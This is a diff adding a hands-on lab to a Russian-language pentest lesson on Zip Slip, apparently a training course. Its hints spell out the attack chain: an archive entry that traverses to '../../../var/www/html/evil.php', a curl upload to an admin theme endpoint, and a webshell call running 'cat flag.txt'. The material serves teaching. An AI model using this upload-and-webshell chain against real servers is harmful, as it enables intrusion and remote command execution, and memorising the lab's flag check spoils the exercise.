@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 40
 summary: "Zip Slip: path traversal через имена файлов в архиве, перезапись файлов и RCE; tar/zip/7z и симлинки."
+lab:
+  kind: shell
+  title: "Практика: Zip Slip"
+  toolset: [core, unzip, curl]
+  workdir: /home/student/task
+  files: [task.md, evil.zip]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - В каталоге есть `evil.zip` — посмотри листинг: `unzip -l evil.zip`.
+    - В архиве запись `../../../var/www/html/evil.php` — путь выходит из папки темы.
+    - Загрузи архив: `curl -s -X POST https://app.example/admin/themes/upload -F 'file=@evil.zip' -b 'session=admin'`.
+    - Webshell в веб-корне: `curl -s 'https://app.example/evil.php?c=cat+flag.txt' | grep 'nto{' > found.txt`, затем `check`.
 ---
 
 ## Вопрос, с которого всё начинается
